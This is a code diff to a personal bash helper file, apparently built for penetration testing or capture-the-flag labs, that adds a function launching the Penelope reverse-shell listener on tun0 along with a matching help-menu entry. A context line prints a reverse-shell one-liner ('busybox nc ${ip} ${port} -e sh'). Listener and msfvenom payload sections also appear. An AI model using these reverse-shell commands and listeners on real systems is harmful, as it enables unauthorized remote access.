@@ -607,6 +607,15 @@ nico.rev.bash() {
   echo "busybox nc ${ip} ${port} -e sh"
 }
 
+# PENELOPE
+nico.penelope() {
+    if [ -z "$1" ]; then
+        python3 ~/Scripts/penelope/penelope.py -i tun0
+    else
+        python3 ~/Scripts/penelope/penelope.py -p "$1" -i tun0
+    fi
+}
+
 # 9) nmap
 # Nmap full TCP scan (IP obligatorio)
 nico.nmap() {
@@ -746,6 +755,7 @@ cat <<'EOF'
 ┌─ SHELLS ─────────────────────────────────────────────────────────────────────┐
 │ nico.nc [port]           → Netcat listener (default varies by function)     │
 │ nico.nc.win [port]       → Netcat listener with rlwrap (default 4444)       │
+│ nico.penelope [port]     → Penelope listener on tun0 (optional port)        │
 └──────────────────────────────────────────────────────────────────────────────┘
 
 ┌─ PAYLOADS (msfvenom) ────────────────────────────────────────────────────────┐
